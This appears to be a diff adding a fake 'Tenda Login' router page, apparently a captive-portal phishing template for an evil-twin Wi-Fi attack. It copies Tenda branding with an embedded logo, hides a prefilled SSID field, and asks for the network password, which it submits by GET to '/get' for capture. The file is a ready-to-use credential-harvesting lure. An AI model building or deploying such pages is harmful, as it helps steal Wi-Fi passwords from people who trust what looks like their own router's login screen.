@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tenda Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #eceff2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: white;
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 320px;
+    }
+    .login-container img {
+      margin-bottom: 20px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    .submit-btn {
+      background-color: #67c200;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .submit-btn:hover {
+      background-color: #5aaa00;
+    }
+    .error-message {
+      color: red;
+      margin: 10px 0;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: gray;
+    }
+    .forgot-password {
+      font-size: 12px;
+      color: #7f8c8d;
+      margin-top: 10px;
+    }
+    .forgot-password a {
+      text-decoration: none;
+      color: #7f8c8d;
+    }
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <!-- Tenda logo -->
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIUAAAAeCAMAAAA1pS2OAAAAulBMVEUAAAD/ZgD/ZgD/agv/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/ZgD/iDf/0bL/sX3/ZgD/YQDtmNfZAAAAPHRSTlMA/EwF2pkOKQrlWDz39OHQjoM48da8uZ6Je1KRcS3pxLapZWFd7bAYeGxAIxwRopUyv35JzMhGFbqxKmtjKgGOAAAEC0lEQVRIx8VXadOaQAzeFRAFEUFQLm8U79vXHvb//63CHtnVtf3UqZnpjCS72SfJk6Qv+l9itjCRPfqk5A8qK/RJ6VMQeIA+KJpOUega+qCYmKL4LC2mjBaz9+b6pfYXSSxrff8XKPaMFuZ7c/L4mzQnU1P7F7RoU3/BH5x1/oigGy79Bju1tfOlF51nlOGXtEMknZIXzCTzOlGc/4X+A+azzxWFPYujjpclNEj9PYTASLZQs/TaZWocHktNj59KEfJTHfNPl6AC2X6tov1i3CvFZSdyCmEVzvkdHEQFQqkBEkIWsiNkzj+0n+DNN6jR5B+2P34GP9Egeu/mKLHhTZW7ePis1X/I2JdcPQZVLSQJiGtrq485y4/8nLMo/7njUMrngd47TsrTqrhaCWJR/mj30jjuMzS/vssoTvzwkuehSn3rwOptsPjRSrh1llV0jWQOGp/E02Jf7dPEMPqTEfs0Slv8CDy/TkvmMi8SiB24simvvcrX6cjtZ5onDU1EC3GjBaqOwNtNGbthWlglywxL9MmM6SUUX9zRkCDdkAA8uLJtk5wWSIMCYJsbG02pmhH9dRKzYUE1rU0Z25sx0ZRUZ+6oV33ZlV8sRp1JshcWJe+wIAHITaBY0x+jBnrF6PKuOyYrLzX6xk3lBbRIXCXGqUDkMGGzeRXLWaNphNBArgIZJYEjGX3e2ASStYDEMXb+fEeLdZkJ0mURs9iRXmGaUJr2RdgiWmjnxIT5BJJxW8WggIUwbOs6JTGWOnUNE2GHthRtGGdxZz8aEranrFW0gB+cqivzgQtW2AvYBC22SDMoETqXza6hFUNl28fceQjDEUQ3anV+btN6qJvJgpPsrrOVFiarwBWx9jLYgrTVbQ8ve9znPND1YLSI8oEElhiVzXTgyj3SlfhsaOL4mdRnZdvXh4IWLoVeJhB8vX1QyFVUqc3aQZ3Jl7tDagtp/abk1IYlUh/86f+pjcw9yA+CbFtceWS5aDaEle0ap7565u0OaKEukROf0NYrCMstab5zOC0GyvQhj7PK2kqWb5wV0A9qN40FLTzZCr7yW8mUBNX4ubYUbUdq3ikMrZcsR2jxzKdYpQVMkgtvb5wJq92pyh2WFYxgiUsQR9IerOssp/5L89X43ZT3g0ILH2hxF714W158/yv3Fm0Sw+zpwUxcLrrA7MoV+8KnaJpPV7WQOS5g9o9mZnEvzKHSahn3MyIrUBEc5iTFd3jQl/cgDDxSAlfcC87HoXC8AnfdbtdRCk9LBlO7dn2CMBxn5uuDzbq47AGzWS9ZfbfZDHppbgIHsUUIrivx5fIewExqdEwnfXfewthp3/aZ/LfAmZ9bICHfuNKT1tJOYxBLfVeffDGGzSa6gyVpVfH9Bm86af1/zBNlAAAAAElFTkSuQmCC" alt="Tenda Logo" width="150">
+    
+    <form action="/get" id="login-form" method="get">
+      <!-- Hidden SSID field -->
+      <input hidden name="email" class="input-field" type="text" placeholder="SSID" value="Tenda" required>
+
+      <!-- Password field -->
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+      
+      <div class="error-message"></div>
+      
+      <!-- Submit button -->
+      <button class="submit-btn" type="submit">Login</button>
+    </form>
+
+    <div class="forgot-password">
+      <a href="#">Forget password?</a>
+    </div>
+  </div>
+
+</body>
+</html>
